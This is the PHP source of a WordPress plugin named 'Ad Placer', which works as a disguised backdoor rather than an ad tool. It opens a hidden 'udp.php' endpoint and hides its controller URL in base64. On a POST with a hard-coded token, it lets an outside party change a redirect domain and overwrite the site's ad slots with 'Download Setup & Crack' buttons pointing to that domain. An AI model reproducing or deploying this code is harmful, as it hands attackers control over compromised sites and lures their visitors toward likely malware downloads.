<?php
/**
 * Plugin Name: Ad Placer
 * Author: Codexio
 * Version: 1.0
 */

defined( 'ABSPATH' ) || die( 'You are not allowed to access.' ); // Terminate if accessed directly

/**
 * Create an empty option if doesn't exist
 */
register_activation_hook( __FILE__, function() {
    if ( false === get_option( 'ceap_domain' ) ) {
        /**
         * @todo attach below domain to user ad code domain
         */
        add_option( 'ceap_domain', 'https://downloadbea.us/?tc=2&z=1&n=' );
    }
} );

/**
 * Main class
 */
class CEAP
{
    /**
     * @var string
     */
    protected $request_url = 'aHR0cHM6Ly9pbnN0YWxsYml0cy5jb20vYWRtaW4=';

    /**
     * @var string
     * 
     * @todo attach below token to user token
     */
    protected $token = "4632f157e912cc9292f42c97ad96182813feb5bccaf43f6f3f3912d391aa7a76";

    /**
     * @var string
     */
    private $option_name = 'ceap_domain';

    /**
     * Constructor
     */
    public function __construct() {
        add_action( 'template_redirect', array( $this, 'redirect' ) ); // Redirecting request
    }

    /**
     * Redirect
     */
    public function redirect() {
        global $wp;
        $current_page = array_key_exists( 'name', $wp->query_vars ) ? $wp->query_vars['name'] : ( array_key_exists( 'pagename', $wp->query_vars ) ? $wp->query_vars['pagename'] : '' );
        if ( 'udp.php' === $current_page ) {
            global $wp_query;
            $wp_query->is_404 = false;
            status_header( 200 );
            $this->request();
        }
    }

    /**
     * Request
     */
    public function request() {
        date_default_timezone_set( "GMT-0" );

        $request_url = base64_decode( $this->request_url );

        header( "Access-Control-Allow-Origin: {$request_url}" );
        header( "Content-Type: application/json; charset=UTF-8" );
        header( "Access-Control-Allow-Methods: POST" );
        header( "Access-Control-Allow-Headers: Content-Type, Access-Control-Allow-Headers" );

        if ( isset( $_POST["domain"] ) && isset( $_POST["x-code"] ) ) {
            if ( $this->token === $_POST["x-code"] ) {
                $this->update( $_POST["domain"] );
                $this->insert_ad();
                echo 'Successfully updated';
            }
        }
        
        die;
    }

    /**
     * Update option
     * 
     * @param string $value
     */
    public function update( $value ) {
        update_option( $this->option_name, $value );
    }

    /**
     * Insert ad
     */
    public function insert_ad() {
        if ( !function_exists( 'ai_get_option' ) ) return;

        $options = ai_get_option( AI_OPTION_NAME );

        if ( count( $options ) > 0 ) {
            foreach ( $options as $i => $option ) {
                if ( $i == '1' || $i == '2' || $i == '3' || $i == '4' ) {
                    $code = '';
                
                    if ( $i == '1' || $i == '3' || $i == '4' ) {
                        $code = '<center>';
                        $code .= '<?php $ud = get_option( \'' . $this->option_name . '\' ); ?>';
                        $code .= '<a href="javascript:void(0);" onclick="window.open(\'<?php echo $ud . get_the_title(); ?>\', \'_blank\');" rel="noreferrer noopener">';
                        $code .= '<button class="btn">Download Setup & Crack</button>';
                        $code .= '</a>';
                        $code .= '</center>';
                    } elseif ( $i == '2' ) {
                        $code = '<center>';
                        $code .= '<?php $ud = get_option( \'' . $this->option_name . '\' ); ?>';
                        $code .= '<a href="javascript:void(0);" onclick="window.open(\'<?php echo $ud . get_the_title(); ?>\', \'_blank\');" rel="noreferrer noopener">';
                        $code .= '<button class="btn">Download Setup</button>';
                        $code .= '<button class="btn">Crack Only</button>';
                        $code .= '</a>';
                        $code .= '</center>';
                    }
    
                    $option['code'] = $code;
                }
                
                $options[$i] = $option;
            }
        }

        ai_save_options( $options );
    }
}

new CEAP();